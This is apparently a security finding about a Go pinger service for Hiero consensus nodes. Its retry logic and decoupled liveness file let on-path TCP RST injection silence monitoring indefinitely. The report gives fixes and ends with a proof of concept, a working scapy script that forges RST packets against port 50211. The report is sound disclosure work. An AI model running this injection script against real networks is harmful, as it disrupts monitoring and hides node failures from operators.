### Title
Persistent RST-Injection Silently Defeats Pinger Monitoring With No Automated Recovery

### Summary
`submitWithRetry()` in `pinger/transfer.go` retries `cryptoTransfer.Execute(client)` up to `cfg.maxRetries+1` times using the same long-lived `hiero.Client` object, with no error classification and no reconnection logic. When an on-path attacker continuously injects TCP RST packets, every attempt fails with a connection-reset error, exhausting all retries and returning `"all attempts failed"` every tick. Critically, the liveness heartbeat goroutine in `main.go` updates `/tmp/alive` unconditionally every 15 seconds, completely decoupled from transfer success, so no automated Kubernetes recovery is ever triggered.

### Finding Description

**Code path:**

`pinger/transfer.go` lines 14–60 (`submitWithRetry`):
```
attempts := cfg.maxRetries + 1          // default: 11
for i := 1; i <= attempts; i++ {
    cryptoTransfer := hiero.NewTransferTransaction()...
    resp, err := cryptoTransfer.Execute(client)   // same client every retry
    ...
    lastErr = err
    // exponential backoff, then retry
}
return fmt.Errorf("all attempts failed: %w", lastErr)
```

`pinger/main.go` lines 62–68 (tick handler):
```go
if err := submitWithRetry(ctx, client, cfg); err != nil {
    if errors.Is(err, context.Canceled) { return }
    log.Printf("transfer failed: %v", err)   // logs and continues — no recovery
}
```

`pinger/main.go` lines 28–39 (liveness goroutine — runs unconditionally):
```go
case <-t.C:
    _ = os.WriteFile("/tmp/alive", []byte(...), 0644)
```

**Root cause / failed assumption:**

1. `submitWithRetry` does not classify errors. A transient TCP error and a persistent RST-injection attack produce identical behavior: retry with backoff, then give up.
2. The same `hiero.Client` (and its internal gRPC connection pool) is reused across all retries and all ticks. There is no `client.Close()`/`newClient()` call on persistent failure.
3. The liveness probe file `/tmp/alive` is written by a goroutine that is entirely independent of transfer success. The process stays "alive" even when 100% of transfers fail.
4. There is no circuit breaker, no alerting, no self-restart, and no readiness-probe degradation on repeated failure.

**Exploit flow:**

An on-path attacker (same network segment, compromised router, or BGP hijack) who can forge TCP RST packets with valid sequence numbers:

1. Intercepts the TCP handshake or existing connection between the pinger and any consensus node gRPC endpoint.
2. Injects a RST segment with a sequence number within the receive window.
3. The gRPC layer tears down the connection; `Execute(client)` returns a `connection reset by peer` error.
4. `submitWithRetry` logs `"attempt 1/11 failed"` and sleeps `baseBackoff` (default 2 s), then retries.
5. Attacker repeats RST injection for each new TCP connection attempt (each retry opens a new connection or reuses a broken one from the pool).
6. After 11 attempts (total wall-clock time ≈ 2+4+8+16+30×6 = ~210 s with default config), `submitWithRetry` returns `"all attempts failed"`.
7. `main()` logs `"transfer failed"` and waits for the next ticker tick.
8. Meanwhile, the liveness goroutine has been writing `/tmp/alive` every 15 s throughout — Kubernetes sees a healthy pod.
9. The cycle repeats indefinitely. The pinger never recovers, never restarts, and never alerts.

**Why existing checks are insufficient:**

- The `ctx.Err()` check (line 24) only catches graceful shutdown, not network errors.
- The `errors.Is(err, context.Canceled)` check in `main()` (line 64) only handles cancellation.
- The liveness probe is process-level, not transfer-level.
- The Hiero SDK's own node-rotation logic can be defeated if the attacker targets all reachable consensus node endpoints (the pinger's network map is fixed at startup).

### Impact Explanation

The pinger is a health-monitoring component. Silencing it means network degradation or consensus node failures go undetected for an indefinite period. The pod reports healthy to Kubernetes (liveness probe passes), readiness file `/tmp/ready` is never removed, and no operator alert fires. The monitoring gap persists for as long as the attacker maintains RST injection — potentially hours or days.

### Likelihood Explanation

RST injection requires an on-path network position (same L2 segment, compromised upstream router, or BGP prefix hijack). This is not a zero-effort attack, but it is well within the capability of a nation-state actor, a cloud-provider insider, or an attacker who has already compromised network infrastructure. The attack is repeatable and requires no credentials, no application-layer access, and no knowledge of cryptographic material. The default `maxRetries=10` and `baseBackoff=2s` make the attack trivially sustainable: the attacker only needs to inject one RST per new TCP connection attempt.

### Recommendation

1. **Decouple liveness from process liveness**: Update `/tmp/alive` only after a successful transfer (or within a configurable grace period of the last success), so Kubernetes restarts the pod after sustained failure.
2. **Classify errors**: Distinguish transient errors (timeout, temporary unavailable) from persistent transport errors (connection reset, connection refused). On N consecutive transport-layer failures, trigger `os.Exit(1)` or remove `/tmp/ready` to force a pod restart.
3. **Refresh the client on persistent failure**: Call `client.Close()` and `newClient(cfg)` after a configurable number of consecutive all-retries-failed ticks, forcing new TCP connections and DNS re-resolution.
4. **Add a success-rate readiness probe**: Remove `/tmp/ready` when the rolling success rate drops below a threshold, causing Kubernetes to mark the pod not-ready and eventually restart it.
5. **Consider TLS/mTLS for gRPC connections to consensus nodes**: Authenticated TLS makes RST injection insufficient on its own because the attacker must also break the TLS session, raising the bar significantly.

### Proof of Concept

**Preconditions:** Attacker has on-path access (e.g., same subnet or compromised gateway) between the pinger pod and the consensus node gRPC endpoints.

**Steps:**

```bash
# 1. Identify the pinger pod's outbound TCP connections to consensus nodes (port 50211)
#    (from attacker's on-path vantage point)

# 2. Use scapy or hping3 to inject RST packets for every new connection:
#    (Python/scapy example — run on attacker's on-path host)
from scapy.all import *

def rst_inject(pkt):
    if TCP in pkt and pkt[TCP].dport == 50211 and pkt[TCP].flags & 0x02:  # SYN
        # Send RST to the pinger's source port
        rst = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
              TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport,
                  seq=0, ack=pkt[TCP].seq+1, flags="RA")
        send(rst, verbose=0)

sniff(filter="tcp port 50211", prn=rst_inject, store=0)

# 3. Observe pinger logs (kubectl logs <pinger-pod>):
#    attempt 1/11 failed: rpc error: ... connection reset by peer
#    attempt 2/11 failed: rpc error: ... connection reset by peer
#    ...
#    attempt 11/11 failed: rpc error: ... connection reset by peer
#    transfer failed: all attempts failed: ...
#    [repeats every tick]

# 4. Verify liveness probe still passes:
kubectl exec <pinger-pod> -- cat /tmp/alive
# → timestamp updates every 15s despite all transfers failing

# 5. Verify no automated recovery occurs:
kubectl get pod <pinger-pod> --watch
# → pod stays Running/Ready indefinitely
```
